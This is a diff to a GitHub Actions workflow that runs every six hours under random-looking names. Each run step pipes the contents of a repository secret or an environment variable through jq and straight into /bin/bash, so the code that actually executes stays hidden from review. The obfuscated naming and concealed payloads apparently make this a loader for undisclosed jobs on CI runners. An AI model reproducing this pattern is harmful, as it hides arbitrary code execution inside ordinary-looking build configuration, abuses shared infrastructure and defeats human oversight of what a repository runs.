@@ -1,9 +1,8 @@
 name: estvaisania
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 4/6 * * *'
+    - cron: '53 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: estvaisania
         env:
-          ts2358: ${{ secrets.ts2358 }}
+          osnf388: ${{ secrets.osnf388 }}
         run: |
-          echo $ts2358 | jq -r .ivo9 | /bin/bash
-          echo $aud73114 | jq -r .a743 | /bin/bash
-          echo $aiat31 | jq -r .rksxu51 | /bin/bash
-          echo $etqu9 | jq -r .g3450 | /bin/bash
-          echo $x521 | jq -r .ix8 | /bin/bash
+          echo $osnf388 | jq -r .ae60691 | /bin/bash
+          echo $ioamk0517 | jq -r .udvy198 | /bin/bash
+          echo $vjjca44 | jq -r .gych849 | /bin/bash
+          echo $h0 | jq -r .b2616 | /bin/bash
+          echo $xiell6804 | jq -r .zyxt6100 | /bin/bash
+          echo $vj72185 | jq -r .vbq80278 | /bin/bash
 
